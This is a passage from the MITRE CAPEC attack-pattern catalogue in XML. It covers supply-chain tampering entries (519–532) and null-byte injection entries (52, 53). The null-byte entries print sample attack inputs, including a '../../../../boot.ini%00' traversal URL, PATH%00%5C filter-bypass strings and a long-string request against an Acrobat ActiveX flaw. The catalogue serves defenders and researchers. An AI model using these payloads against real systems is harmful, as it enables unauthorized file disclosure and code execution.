            <Example>A security subsystem involving encryption is a part of a product, but due to the demands of this subsystem during operation, the subsystem only runs when a specific amount of memory and processing is available. An attacker alters the descriptions of the system capabilities so that when deployed with the minimal requirements at the victim location, the encryption subsystem is never operational, leaving the system in a weakened security state.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-439"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="519" Name="Documentation Alteration to Cause Errors in System Design" Abstraction="Detailed" Status="Draft">
         <Description>An attacker with access to a manufacturer's documentation containing requirements allocation and software design processes maliciously alters the documentation in order to cause errors in system design. This allows the attacker to take advantage of a weakness in a deployed system of the manufacturer for malicious purposes.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="447"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Advanced knowledge of software capabilities of a manufacturer's product.</Prerequisite>
            <Prerequisite>Access to the manufacturer's documentation.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Ability to read, interpret, and subsequently alter manufacturer's documentation to cause errors in system design.</Skill>
            <Skill Level="High">Ability to stealthly gain access via remote compromise or physical access to the manufacturer's documentation.</Skill>
         </Skills_Required>
         <Example_Instances>
            <Example>During operation, a firewall will restart various subsystems to reload and implement new rules as added by the user. An attacker alters the software design dependencies in the manufacturer's documentation so that under certain predictable conditions the reload will fail to load in rules resulting in a "fail open" state. Once deployed at a victim site, this will allow the attacker to bypass the victim's firewall.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-439"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="52" Name="Embedding NULL Bytes" Abstraction="Detailed" Status="Draft">
         <Description>An attacker embeds one or more null bytes in input to the target software. This attack relies on the usage of a null-valued byte as a string terminator in many environments. The goal is for certain components of the target software to stop processing the input when it encounters the null byte(s).</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>Identify a place in the program where user input may be used to escalate privileges by for instance accessing unauthorized file system resources through directory browsing.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>An attacker realizes that there is a postfix data that gets in the way of getting to the desired resources</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>An attacker then ads a postfix NULL terminator to the supplied input in order to "swallow" the postfixed data when the insertion is taking place. With the postfix data that got in the way of the attack gone, the doors are opened for accessing the desired resources.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The program does not properly handle postfix NULL terminators</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Directory traversal</Skill>
            <Skill Level="High">Execution of arbitrary code</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Properly handle the NULL characters supplied as part of user input prior to doing anything with the data.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>Directory Browsing</xhtml:p>
               <xhtml:p>Assume a Web application allows a user to access a set of reports. The path to the reports directory may be something like web/username/reports. If the username is supplied via a hidden field, an attacker could insert a bogus username such as ../../../../../WINDOWS. If the attacker needs to remove the trailing string /reports, then he can simply insert enough characters so the string is truncated. Alternatively the attacker might apply the postfix NULL character (%00) to determine whether this terminates the string.</xhtml:p>
               <xhtml:p>Different forms of NULL to think about include</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">PATH%00<xhtml:br/>PATH[0x00]<xhtml:br/>PATH[alternate representation of NULL character]<xhtml:br/>&lt;script&gt;&lt;/script&gt;%00</xhtml:div>
            </Example>
            <Example>
               <xhtml:p>Exploitation of a buffer overflow vulnerability in the ActiveX component packaged with Adobe Systems Inc.'s Acrobat/Acrobat Reader allows remote attackers to execute arbitrary code.</xhtml:p>
               <xhtml:p>The problem specifically exists upon retrieving a link of the following form:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">GET /any_existing_dir/any_existing_pdf.pdf%00[long string] HTTP/1.1</xhtml:div>
               <xhtml:p>Where [long string] is a malicious crafted long string containing acceptable URI characters. The request must be made to a web server that truncates the request at the null byte (%00), otherwise an invalid file name is specified and a "file not found" page will be returned. Example web servers that truncate the requested URI include Microsoft IIS and Netscape Enterprise. Though the requested URI is truncated for the purposes of locating the file the long string is still passed to the Adobe ActiveX component responsible for rendering the page. This in turn triggers a buffer overflow within RTLHeapFree() allowing for an attacker to overwrite an arbitrary word in memory. The responsible instructions from RTLHeapFree() are shown here:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">0x77F83AE5 MOV EAX,[EDI+8]<xhtml:br/>0x77F83AE8 MOV ECX,[EDI+C]<xhtml:br/>...<xhtml:br/>0x77F83AED MOV [ECX],EAX</xhtml:div>
               <xhtml:p>The register EDI contains a pointer to a user-supplied string. The attacker therefore has control over both the ECX and EAX registers used in the shown MOV instruction.</xhtml:p>
               <xhtml:p>Successful exploitation allows remote attackers to utilize the arbitrary word overwrite to redirect the flow of control and eventually take control of the affected system. Code execution will occur under the context of the user that instantiated the vulnerable version of Adobe Acrobat.</xhtml:p>
               <xhtml:p>An attacker does not need to establish a malicious web site as exploitation can occur by adding malicious content to the end of any embedded link and referencing any Microsoft IIS or Netscape Enterprise web server. Clicking on a direct malicious link is also not required as it may be embedded within an IMAGE tag, an IFRAME or an auto-loading script.</xhtml:p>
               <xhtml:p>Successful exploitation requires that a payload be written such that certain areas of the input are URI acceptable. This includes initial injected instructions as well as certain overwritten addresses. This increases the complexity of successful exploitation. While not trivial, exploitation is definitely plausible [R.52.2].</xhtml:p>See also: CVE-2004-0629</Example>
            <Example>
               <xhtml:p>Consider the following PHP script:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">$whatever = addslashes($_REQUEST['whatever']);<xhtml:br/>include("/path/to/program/" . $whatever . "/header.htm");</xhtml:div>
               <xhtml:p>A malicious attacker might open the following URL, disclosing the boot.ini file:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">http://localhost/phpscript.php?whatever=../../../../boot.ini%00</xhtml:div>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="158"/>
            <Related_Weakness CWE_ID="172"/>
            <Related_Weakness CWE_ID="173"/>
            <Related_Weakness CWE_ID="171"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="697"/>
            <Related_Weakness CWE_ID="707"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
            <Reference External_Reference_ID="REF-445"/>
            <Reference External_Reference_ID="REF-446"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="520" Name="Counterfeit Hardware Component Inserted During Product Assembly" Abstraction="Detailed" Status="Draft">
         <Description>An attacker with either direct access to the product assembly process or to the supply of subcomponents used in the product assembly process introduces counterfeit hardware components into product assembly. The assembly containing the counterfeit components results in a system specifically designed for malicious purposes.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="444"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The attacker will need either physical access or be able to supply malicious hardware components to the product development facility.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Resources to maliciously construct components used by the manufacturer.</Skill>
            <Skill Level="High">Resources to physically infiltrate manufacturer or manufacturer's supplier.</Skill>
         </Skills_Required>
         <Example_Instances>
            <Example>A manufacturer of a firewall system requires a hardware card which functions as a multi-jack ethernet card with four ethernet ports. The attacker constructs a counterfeit card that functions normally except that packets from the attacker's network are allowed to bypass firewall processing completely. Once deployed at a victim location, this allows the attacker to bypass the firewall unrestricted.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-439"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="521" Name="Hardware Design Specifications Are Altered" Abstraction="Detailed" Status="Draft">
         <Description>An attacker with access to a manufacturer's hardware manufacturing process documentation alters the design specifications, which introduces flaws advantageous to the attacker once the system is deployed.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="447"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Advanced knowledge of hardware capabilities of a manufacturer's product.</Prerequisite>
            <Prerequisite>Access to the manufacturer's documentation.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Ability to read, interpret, and subsequently alter manufacturer's documentation to cause errors in design specifications.</Skill>
            <Skill Level="High">Ability to stealthly gain access via remote compromise or physical access to the manufacturer's documentation.</Skill>
         </Skills_Required>
         <Example_Instances>
            <Example>To operate at full capability, a manufacturer's network intrusion detection device needs to have either a Intel Xeon E7-2820 or AMD FX-8350 which have 8 "cores" available, allowing for advanced threading needed to handle large volumes of network traffic without resorting to dropping packets from the detection process. The attacker alters the documentation to state that the system design must use the Intel Core Duo or the AMD Phenom II X2, which only have 2 cores, causing the system to drop large amounts of packets during deployment at a victim site with large amounts of network traffic.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-439"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="522" Name="Malicious Hardware Component Replacement" Abstraction="Standard" Status="Draft">
         <Description>An attacker replaces legitimate hardware in the system with faulty counterfeit or tampered hardware in the supply chain distribution channel, with purpose of causing malicious disruption or allowing for additional compromise when the system is deployed.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="439"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Physical access to the system after it has left the manufacturer but before it is deployed at the victim location.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Advanced knowledge of the design of the system.</Skill>
            <Skill Level="High">Hardware creation and manufacture of replacement components.</Skill>
         </Skills_Required>
         <Example_Instances>
            <Example>During shipment the attacker is able to intercept a system that has been purchased by the victim, and replaces a math processor card that functions just like the original, but contains advanced malicious capability. Once deployed, the system functions as normal, but allows for the attacker to remotely communicate with the system and use it as a conduit for additional compromise within the victim's environment.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-439"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="523" Name="Malicious Software Implanted" Abstraction="Standard" Status="Draft">
         <Description>An attacker implants malicious software into the system in the supply chain distribution channel, with purpose of causing malicious disruption or allowing for additional compromise when the system is deployed.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="439"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Physical access to the system after it has left the manufacturer but before it is deployed at the victim location.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Advanced knowledge of the design of the system and it's operating system components and subcomponents.</Skill>
            <Skill Level="High">Malicious software creation.</Skill>
         </Skills_Required>
         <Example_Instances>
            <Example>An attacker has created a piece of malicious software designed to function as a backdoor in a system that is to be deployed at the victim location. During shipment of the system, the attacker has physical access to the system at a loading dock of an integrator for a short time. The attacker unpacks and powers up the system and installs the malicious piece of software, and configures it to run upon system boot. The system is repackaged and returned to its place on the loading dock, and is shipped and installed at the victim location with the malicious software in place, allowing the attacker to bypass firewalls and remotely gain access to the victim's network for further malicious activities.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-439"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="524" Name="Rogue Integration Procedures" Abstraction="Standard" Status="Draft">
         <Description>An attacker alters or establishes rogue processes in an integration facility in order to insert maliciously altered components into the system. The attacker would then supply the malicious components. This would allow for malicious disruption or additional compromise when the system is deployed.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="439"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Physical access to an integration facility that prepares the system before it is deployed at the victim location.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Advanced knowledge of the design of the system.</Skill>
            <Skill Level="High">Hardware creation and manufacture of replacement components.</Skill>
         </Skills_Required>
         <Example_Instances>
            <Example>An attacker gains access to a system integrator's documentation for the preparation of purchased systems designated for deployment at the victim's location. As a part of the preparation, the included 100 megabit network card is to be replaced with a 1 gigabit network card. The documentation is altered to reflect the type of 1 gigabit network card to use, and the attacker ensures that this type of network card is provided by the attacker's own supply. The card has additional malicious functionality which will allow for additional compromise by the attacker at the victim location once the system is deployed.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-439"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="528" Name="XML Flood" Abstraction="Standard" Status="Draft">
         <Description>An adversary may execute a flooding attack using XML messages with the intent to deny legitimate users access to a web service. These attacks are accomplished by sending a large number of XML based requests and letting the service attempt to parse each one.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="125"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This type of an attack requires the ability to generate a large amount of XML based messages to send to a target service.</Prerequisite>
         </Prerequisites>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="770"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="529" Name="Malware-Directed Internal Reconnaissance" Abstraction="Standard" Status="Stable">
         <Description>Adversary uses malware or a similarly controlled application installed inside an organizational perimeter to gather information about the composition, configuration, and security mechanisms of a targeted application, system or network.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="169">
               <Exclude_Related Exclude_ID="512"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have internal, logical access to the target network and system.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">The adversary must be able to obtain or develop, as well as place malicious software inside the target network/system.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>The adversary requires a variety of tools to collect information about the target. These include port/network scanners and tools to analyze responses from applications to determine version and configuration information. Footprinting a system adequately may also take a few days if the attacker wishes the footprinting attempt to go undetected.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Keep patches up to date by installing weekly or daily if possible.</Mitigation>
            <Mitigation>Identify programs that may be used to acquire peripheral information and block them by using a software restriction policy or tools that restrict program execution by process whitelisting.</Mitigation>
         </Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="53" Name="Postfix, Null Terminate, and Backslash" Abstraction="Detailed" Status="Draft">
         <Description>If a string is passed through a filter of some kind, then a terminal NULL may not be valid. Using alternate representation of NULL allows an attacker to embed the NULL mid-string while postfixing the proper data so that the filter is avoided. One example is a filter that looks for a trailing slash character. If a string insertion is possible, but the slash must exist, an alternate encoding of NULL in mid-string may be used.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="267"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Experiment</Phase>
               <Description>An attacker first probes to figure out what restrictions on input are placed by filter, such as a specific characters on the end of the URL.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Exploit</Phase>
               <Description>The attacker then injects a string of their choosing with a null terminator (using an alternate encoding such as %00), followed by a backslash (%5C), followed by some additional characters that are required to keep the filter happy</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>
                  <xhtml:p>The malicious string then passes through the filter and passed to the underlying API. Everything after the null terminator is ignored. This may give an attacker the opportunity to access file system resources to which they should not have access and do other things.</xhtml:p>
                  <xhtml:p>Some popular forms in which this takes place:</xhtml:p>
                  <xhtml:div style="margin-left:10px;" class="informative">PATH%00%5C<xhtml:br/>PATH[0x00][0x5C]<xhtml:br/>PATH[alternate encoding of the NULL][additional characters required to pass filter]</xhtml:div>
               </Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Null terminators are not properly handled by the filter.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">An attacker needs to understand alternate encodings, what the filter looks for and the data format acceptable to the target API</Skill>
         </Skills_Required>
         <Indicators>
            <Indicator>Null characters are observed by the filter. The filter needs to be able to understand various encodings of the Null character, or only canonical data should be passed to it.</Indicator>
         </Indicators>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Properly handle Null characters. Make sure canonicalization is properly applied. Do not pass Null characters to the underlying APIs.</Mitigation>
            <Mitigation>Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>A rather simple injection is possible in a URL:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">http://getAccessHostname/sekbin/<xhtml:br/>helpwin.gas.bat?mode=&amp;draw=x&amp;file=x&amp;module=&amp;locale=[insert relative path here]<xhtml:br/>[%00][%5C]&amp;chapter=</xhtml:div>
               <xhtml:p>This attack has appeared with regularity in the wild. There are many variations of this kind of attack. Spending a short amount of time injecting against Web applications will usually result in a new exploit being discovered.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="158"/>
            <Related_Weakness CWE_ID="172"/>
            <Related_Weakness CWE_ID="173"/>
            <Related_Weakness CWE_ID="171"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="697"/>
            <Related_Weakness CWE_ID="707"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="530" Name="Provide Counterfeit Component" Abstraction="Detailed" Status="Draft">
         <Description>An attacker provides a counterfeit component during the procurement process of a lower-tier component supplier to a sub-system developer or integrator, which is then built into the system being upgraded or repaired by the victim, allowing the attacker to cause disruption or additional compromise.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="531"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Advanced knowledge about the target system and sub-components.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Able to develop and manufacture malicious system components that resemble legitimate name-brand components.</Skill>
         </Skills_Required>
         <Example_Instances>
            <Example>The attacker, aware that the victim has contracted with an integrator for system maintenance and that the integrator uses commercial-off-the-shelf network hubs, develops their own network hubs with a built-in malicious capability for remote access, the malicious network hubs appear to be a well-known brand of network hub but are not. The attacker then advertises to the sub-system integrator that they are a legit supplier of network hubs, and offers them at a reduced price to entice the integrator to purchase these network hubs. The integrator then installs the attacker's hubs at the victim's location, allowing the attacker to remotely compromise the victim's network.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-439"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Counterfeit Component Supplied</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="531" Name="Hardware Component Substitution" Abstraction="Detailed" Status="Draft">
         <Description>An attacker substitutes out a tested and approved hardware component for a maliciously-altered hardware component. This type of attack is carried out directly on the system, enabling the attacker to then cause disruption or additional compromise.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="534"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Physical access to the system or the integration facility where hardware components are kept.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Able to develop and manufacture malicious system components that perform the same functions and processes as their non-malicious counterparts.</Skill>
         </Skills_Required>
         <Example_Instances>
            <Example>An attacker has access to an organization's warehouse of card readers being included as a part of an overall security system. By replacing a critical hardware component in the card reader, the attacker is able to alter the function of the card reader to allow an attacker-supplied card to bypass a security checkpoint. The card reader is placed in the warehouse, and later used in the victim's security system. The attacker is then able to go to the victim and use their own card and bypass a physical security checkpoint and gain access to the victim's location for further malicious activity.</Example>
         </Example_Instances>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary, Examples-Instances, References, Related_Attack_Patterns, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2015-11-09">Hardware Component Substitution After Installation</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="532" Name="Altered Installed BIOS" Abstraction="Detailed" Status="Stable">
         <Description>An attacker with access to download and update system software sends a maliciously altered BIOS to the victim or victim supplier/integrator, which when installed allows for future exploitation.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
